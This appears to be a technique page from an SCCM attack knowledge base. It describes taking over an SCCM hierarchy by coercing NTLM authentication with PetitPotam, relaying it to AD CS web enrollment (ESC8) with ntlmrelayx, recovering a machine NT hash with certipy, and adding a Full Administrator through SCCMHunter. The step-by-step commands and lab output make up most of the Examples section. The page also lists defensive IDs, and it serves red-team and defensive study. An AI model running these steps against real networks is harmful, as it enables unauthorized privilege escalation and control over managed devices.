# TAKEOVER-3

## Description
Hierarchy takeover via NTLM coercion and relay to HTTP on AD CS

## MITRE ATT&CK TTPs
- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation
- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement

## Requirements
### Coercion
- Valid Active Directory domain credentials
- Connectivity to SMB (TCP/445) on a coercion target:
    - TAKEOVER-3.1: Coerce primary site server
    - TAKEOVER-3.2: Coerce SMS Provider
    - TAKEOVER-3.3: Coerce passive site server
    - TAKEOVER-3.4: Coerce site database server
- Connectivity from the coercion target to SMB (TCP/445) on the relay server (or WebClient enabled and connectivity via any port)
- Coercion target settings:
    - `BlockNTLM` = `0` or not present, or = `1` and `BlockNTLMServerExceptionList` contains attacker relay server [DEFAULT]
    - `RestrictSendingNTLMTraffic` = `0`, `1`, or not present, or = `2` and  `ClientAllowedNTLMServers` contains attacker relay server [DEFAULT]
    - Domain computer account is not in `Protected Users` [DEFAULT]
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains coercion target [DEFAULT]

### Relay
- Either of the following AD CS services is in use:
    - Certificate Authority Web Enrollment [NON-DEFAULT]
    - Certificate Enrollment Web Service [NON-DEFAULT]
- Connectivity from the relay server to HTTPS (TCP/443) on the relay target hosting the AD CS service
- Extended protection for authentication is not required by the target AD CS service [DEFAULT]
- An enabled AD CS template that allows enrollment and supports authentication 
- Relay target settings:
    - `RestrictReceivingNTLMTraffic` = `0` or not present [DEFAULT]
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains relay target [DEFAULT]
    - `LmCompatibilityLevel` < `5` or not present, or = `5` and LmCompatibilityLevel >= `3` on the coercion target [DEFAULT]

## Summary
When available, SCCM uses public key infrastructure (PKI) for authentication and authorization. While not required, administrators may choose to deploy Active Directory Certificate Services (AD CS) to support SCCM's [various certificate requirements](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/security/plan-for-certificates) rather than use self-signed certificates. AD CS is home to its own [misconfigurations](https://posts.specterops.io/certified-pre-owned-d95910965cd2); particularly ESC8. In short, the [certificate enrollment web interface](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831649(v=ws.11)) is vulnerable to NTLM relaying. An attacker may coerce NTLM authentication from a coercion target and relay to the AD CS enrollment web service to enroll in and acquire a valid certificate template on behalf of the target. The template can then be used to escalate to "Full Administrator" in SCCM by impersonating the coerced target.

## Impact
The "Full Administrator" security role is granted all permissions in Configuration Manager for all scopes and all collections. An attacker with this privilege can execute arbitrary programs on any client device that is online as SYSTEM, the currently logged on user, or as a specific user when they next log on. They can also leverage tools such as CMPivot and Run Script to query or execute scripts on client devices in real-time using the AdminService or WMI on an SMS Provider.

## Defensive IDs
- [DETECT-1: Monitor site server domain computer accounts authenticating from another source](../../../defense-techniques/DETECT/DETECT-1/detect-1_description.md)
- [PREVENT-11: Disable and uninstall WebClient on site servers](../../../defense-techniques/PREVENT/PREVENT-11/prevent-11_description.md)
- [PREVENT-14: Require EPA on AD CS and site databases](../../../defense-techniques/PREVENT/PREVENT-14/prevent-14_description.md)
- [PREVENT-20: Block unnecessary connections to site systems](../../../defense-techniques/PREVENT/PREVENT-20/prevent-20_description.md)

## Subtechniques
- TAKEOVER-3.1: Coerce primary site server
- TAKEOVER-3.2: Coerce SMS Provider
- TAKEOVER-3.3: Coerce passive site server
- TAKEOVER-3.4: Coerce site database server

## Examples
The steps to execute TAKEOVER-3.1 through TAKEOVER-3.4 are the same except that a different system is targeted for coercion of NTLM authentication. The following example assumes the AD CS service has been previously enumerated and the web enrollment form is vulnerable to ESC8.

1. Use `SCCMHunter` to  profile SCCM infrastructure:

    ```
    [12:24:25 AM] INFO     [+] Finished profiling all discovered computers.                                   
    [12:24:25 AM] INFO     +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                        | Hostname                | SiteCode   | SigningStatus   | SiteServer   | ManagementPoint   | DistributionPoint   | SMSProvider   | WSUS   | MSSQL   |
                        +=========================+============+=================+==============+===================+=====================+===============+========+=========+
                        | provider.internal.lab   | None       | False           | False        | False             | False               | True          | False  | False   |
                        +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+
                        | sccm.internal.lab       | LAB        | False           | True         | True              | False               | True          | False  | False   |
                        +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+       
    ```

2. On the attacker relay server, start `ntlmrelayx`, targeting the URL of the certificate enrollment web interface on the certificate authority:

    ```
    └─# ntlmrelayx.py -t http://ca.internal.lab/certsrv/certfnsh.asp --adcs -smb2support
    Impacket v0.12.0.dev1+20240130.154745.97007e84 - Copyright 2023 Fortra

    [*] Protocol Client SMB loaded..
    [*] Protocol Client IMAPS loaded..
    [*] Protocol Client IMAP loaded..
    [*] Protocol Client RPC loaded..
    [*] Protocol Client DCSYNC loaded..
    [*] Protocol Client MSSQL loaded..
    [*] Protocol Client LDAPS loaded..
    [*] Protocol Client LDAP loaded..
    [*] Protocol Client SMTP loaded..
    [*] Protocol Client HTTPS loaded..
    [*] Protocol Client HTTP loaded..
    [*] Running in relay mode to single host
    [*] Setting up SMB Server
    [*] Setting up HTTP Server on port 80
    [*] Setting up WCF Server
    [*] Setting up RAW Server on port 6666

    [*] Servers started, waiting for connections
    ```

3. From the attacker host, coerce NTLM authentication from the site server via SMB, targeting the relay server's IP address:

    ```
    ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
    └─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <SITE_SERVER_IP> 

    Trying pipe lsarpc
    [-] Connecting to ncacn_np:10.10.100.121[\PIPE\lsarpc]
    [+] Connected!
    [+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
    [+] Successfully bound!
    [-] Sending EfsRpcOpenFileRaw!
    [-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
    [+] OK! Using unpatched function!
    [-] Sending EfsRpcEncryptFileSrv!
    [+] Got expected ERROR_BAD_NETPATH exception!!
    [+] Attack worked!
    ```

    After a few seconds, you should receive an SMB connection on the relay server that is forwarded to the cert enrollment service to request a certificate for the coercion target:

    ```
    [*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.100.9, attacking target http://ca.internal.lab
    [*] HTTP server returned error code 200, treating as a successful login
    [*] Authenticating against http://ca.internal.lab as LAB/SCCM$ SUCCEED
    [*] SMBD-Thread-7 (process_request_thread): Connection from 10.10.100.9 controlled, but there are no more targets left!
    [*] Generating CSR...
    [*] CSR generated!
    [*] Getting certificate...
    [*] GOT CERTIFICATE! ID 9
    [*] Base64 certificate of user SCCM$:
    MIIQ/QIBAzCCELcGCSqGSIb3DQEHAaCCEKgEghCkMIIQoDCCBtcGCSqGSIb3DQEHB.....
    ```

4. Use `certipy` to recover the coerced target's NT hash:

    ```
    └─# certipy auth -pfx sccm.pfx
    Certipy v4.8.2 - by Oliver Lyak (ly4k)

    [*] Using principal: sccm$@internal.lab
    [*] Trying to get TGT...
    [*] Got TGT
    [*] Saved credential cache to 'sccm.ccache'
    [*] Trying to retrieve NT hash for 'sccm$'
    [*] Got hash for 'sccm$@internal.lab': aad3b435b51404eeaad3b435b51404ee:075f745ec2daeb97c87b30d1d394f28b
    ```

5. Use `SCCMHunter` to authenticate to an SMS Provider as the site server and grant a user the Full Administrator role:

```
└─# python3 sccmhunter.py admin -u sccm\$ -p aad3b435b51404eeaad3b435b51404ee:075f745ec2daeb97c87b30d1d394f28b -ip 10.10.100.9
    
[06:53:08 PM] INFO     [!] Enter help for extra shell commands                                                                                               
() C:\ >> show_admins 
[06:53:11 PM] INFO     Tasked SCCM to list current SMS Admins.                                                                                               
[06:53:11 PM] INFO     Current Full Admin Users:                                                                                                             
[06:53:11 PM] INFO     lab\Administrator                                                                                                                     
() (C:\) >> get_user specter
[06:53:13 PM] INFO     [*] Collecting users...                                                                                                               
[06:53:13 PM] INFO     [+] User found.                                                                                                                       
[06:53:14 PM] INFO     ------------------------------------------                                                                                            
                       DistinguishedName: CN=specter,OU=DOMUSERS,DC=internal,DC=lab                                                                          
                       FullDomainName: INTERNAL.LAB                                                                                                          
                       FullUserName: specter                                                                                                              
                       Mail:                                                                                                                                 
                       NetworkOperatingSystem: Windows NT                                                                                                    
                       ResourceId: 2063597574                                                                                                                
                       sid: S-1-5-21-2391214593-4168590120-2599633397-1109                                                                                   
                       UniqueUserName: lab\specter                                                                                                           
                       UserAccountControl: 66048                                                                                                             
                       UserName: specter                                                                                                           
                       UserPrincipalName: specter@internal.lab                                                                                        
                       ------------------------------------------                                                                                            
() (C:\) >> add_admin specter S-1-5-21-2391214593-4168590120-2599633397-1109
[06:53:19 PM] INFO     Tasked SCCM to add specter as an administrative user.                                                                                 
[06:53:19 PM] INFO     [+] Successfully added specter as an admin.                                                                                           
() (C:\) >> show_admins 
[06:53:20 PM] INFO     Tasked SCCM to list current SMS Admins.                                                                                               
[06:53:20 PM] INFO     Current Full Admin Users:                                                                                                             
[06:53:20 PM] INFO     lab\Administrator                                                                                                                     
[08:46:39 PM] INFO     specter 
```

## References
- Will Schroeder and Lee Chagolla-Christensen, [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- Oliver Lyak, [Certipy](https://github.com/ly4k/Certipy)
- Microsoft, [Plan for PKI certificates in Configuration Manager](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/security/plan-for-certificates)
